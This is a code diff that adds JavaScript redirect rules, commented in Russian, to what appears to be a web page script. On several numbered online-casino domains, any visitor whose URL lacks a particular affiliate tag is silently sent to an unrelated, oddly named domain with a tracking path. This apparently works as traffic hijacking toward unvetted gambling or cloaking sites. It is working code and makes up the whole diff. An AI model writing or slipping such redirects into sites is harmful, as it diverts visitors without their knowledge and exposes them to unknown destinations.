@@ -17,7 +17,19 @@
     const currentUrl = window.location.href;
 
     // Условия для редиректа
-
+    if (currentUrl.includes("catcasino809.com") && !currentUrl.includes("catcasino809.com/ru?stag=104642")) {
+        window.location.href = "https://catchthecatsix.com/sb2510e0d";
+    } else if (currentUrl.includes("kentcasino973.com") && !currentUrl.includes("kentcasino973.com/?stag=104642")) {
+        window.location.href = "https://passage-through-deserts.com/s7599a8fb";
+    } else if (currentUrl.includes("daddycasino872.com") && !currentUrl.includes("daddycasino872.com/?stag=104642")) {
+        window.location.href = "https://nice-road-five.com/s8fb5e1d2";
+    } else if (currentUrl.includes("gamacasino861.com") && !currentUrl.includes("gamacasino861.com/?stag=104642")) {
+        window.location.href = "https://cleellbert.com/see130fa1";
+    } else if (currentUrl.includes("r7casino525.com") && !currentUrl.includes("r7casino525.com/?stag=104642")) {
+        window.location.href = "https://aristocratic-hall.com/sc7972243";
+    } else if (currentUrl.includes("kometacasino733.com") && !currentUrl.includes("kometacasino733.com/?stag=104642")) {
+        window.location.href = "https://spangle-flight.com/sd8ea9f6f";
+    } else if (currentUrl.includes("arkadacasino728.com") && !currentUrl.includes("arkadacasino728.com/?stag=104642")) {
+        window.location.href = "https://synthed-neonway.com/s0d74b268";
     }
 })();
-1234
